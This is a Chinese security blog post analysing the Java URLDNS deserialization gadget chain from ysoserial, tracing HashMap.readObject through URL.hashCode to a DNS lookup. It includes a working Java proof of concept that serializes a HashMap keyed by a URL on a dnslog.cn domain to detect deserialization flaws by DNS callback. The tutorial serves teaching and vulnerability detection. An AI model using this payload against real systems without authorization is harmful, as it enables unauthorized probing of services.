
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/k1115h0t/p/18887599" title="发布于 2025-05-20 18:50">
    <span role="heading" aria-level="2">Java安全01——URLDNS链分析与利用</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="urldns链分析与利用"><strong>URLDNS链分析与利用</strong></h1>
<h2 id="作用">作用</h2>
<ul>
<li>URLDNS 利用链只能发起 DNS 请求，不能执行命令，所以用于漏洞的检测</li>
<li>不限制JDK版本，使用Java内置类，无第三方依赖要求</li>
<li>可以进行无回显探测</li>
</ul>
<h2 id="利用链">利用链</h2>
<img src="https://img2024.cnblogs.com/blog/2588316/202505/2588316-20250520184348105-1138975755.png" alt="img1" style="zoom: 33%">
<p>​		利用链可以查看开源项目：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener nofollow">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<pre><code class="language-java"> *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
</code></pre>
<h2 id="利用链分析">利用链分析</h2>
<h3 id="1确定最终的目标">1、确定最终的目标</h3>
<p>​		根据上面的利用链发现最后执行的函数为URL.hashCode()</p>
<img src="https://img2024.cnblogs.com/blog/2588316/202505/2588316-20250520184445294-498299619.png" alt="img2" style="zoom: 50%">
<p>​		可以判断，如果直接return是不行的，所以需要执行到handler.hashCode()，并进一步执行getHostAddress()函数</p>
<img src="https://img2024.cnblogs.com/blog/2588316/202505/2588316-20250520184455739-1744653268.png" alt="img3" style="zoom: 50%">
<p>​		确定是InetAddress.getByName(host) 执行的DNS解析，并触发DNS回显</p>
<img src="https://img2024.cnblogs.com/blog/2588316/202505/2588316-20250520184513384-577507886.png" alt="img4" style="zoom: 50%">
<h3 id="2从头开始梳理判断请求执行的条件">2、从头开始梳理，判断请求执行的条件</h3>
<p>​		基于对上面代码的分析，只要在反序列化的过程中执行到URL.hashCode()就可以出发DNS请求了</p>
<p>​		<strong>那么就从HashMap.readobject()开始分析</strong></p>
<pre><code class="language-java">HashMap.readobject()代码：

    private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {
..............................................................................省略前面无关的代码
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings &lt; 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings &gt; 0) {
.............................................................................省略无关的代码
            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i &lt; mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false); 
            }
        }
    }
</code></pre>
<p>​	所以执行到putVal()的条件是</p>
<pre><code>int mappings获取键值对数量 =》 mappings&gt;0
</code></pre>
<p>​	<strong>继续查看HashMap.hash()详细内容</strong></p>
<pre><code class="language-java">HashMap.hash()代码

    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
    }
</code></pre>
<p>执行逻辑</p>
<pre><code>int mappings获取键值对数量 =》 mappings&gt;0 =》 putVal() =&gt; hash(key) =&gt; key不为空 =》key.hashCode 这里实际执行的是URL.hashCode()
</code></pre>
<p>​	这里需要注意的是，如果想要利用这个链，那么传入的数据应当是URL类型，所以应该去URL类的源码中查看其hashCode()</p>
<pre><code class="language-java">URL.hashCode()代码

    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
</code></pre>
<p>​		到此处就回到一开始分析的部分了，也就是只要执行URL.hashCode(key)就行了，其中Key为URL类对象</p>
<h2 id="利用测试">利用测试</h2>
<pre><code class="language-java">import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {
        HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); //创建一个HashMap对象
        URL url = new URL("http://hgbaug.dnslog.cn"); //创建一个URL对象，用于DNSLog回显测试
        Field hashCode = url.getClass().getDeclaredField("hashCode"); //通过反射机制获取url对象中的hashCode属性值
        hashCode.setAccessible(true);//hashCode由private int hashCode = -1定义，所以需要使用setAccessible
        hashCode.set(url,999);//这三行看下面的解释
        hashMap.put(url,999);
        hashCode.set(url,-1);
        //执行序列化操作
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));
        objectOutputStream.writeObject(hashMap);
        //执行反序列化操作，并加载HashMap自定义的 readObject()，自此进入利用链
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.ser"));
        objectInputStream.readObject();
    }
    }
</code></pre>
<h3 id="关于上述代码15行-17行的问题">关于上述代码15行-17行的问题</h3>
<p>​	<strong>为什么要先设为非-1，然后再设置为-1呢？</strong></p>
<p>​		查看HashMap.put()的代码可以发现，这里也调用了putVal()</p>
<p>​		如果此时hashcode的值为-1，那么就会直接进入流程利用链的后三个流程，如下：</p>
<pre><code>putVal() =&gt; hash(key) =&gt; key不为空 =》key.hashCode 这里实际执行的是URL.hashCode()
</code></pre>
<p>​		那么就会导致一个问题，代码没进入到反序列化就直接发起dns请求了，这会导致无法判断目标是否存在反序列化漏洞</p>
<p>​		所以再put之前，需要让hashcode的值不为-1。等到put操作完成即将进入序列化和反序列化时再将其设为-1。进而达到判断目标是否有反序列化漏洞的目的</p>
<pre><code class="language-java">HashMap.put()代码

    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0690864781087963" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-05-20 18:51">2025-05-20 18:50</span>&nbsp;
<a href="https://www.cnblogs.com/k1115h0t">k1115h0t</a>&nbsp;
阅读(<span id="post_view_count">4</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18887599);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18887599', targetLink: 'https://www.cnblogs.com/k1115h0t/p/18887599', title: 'Java安全01——URLDNS链分析与利用' })">举报</a>
</div>
        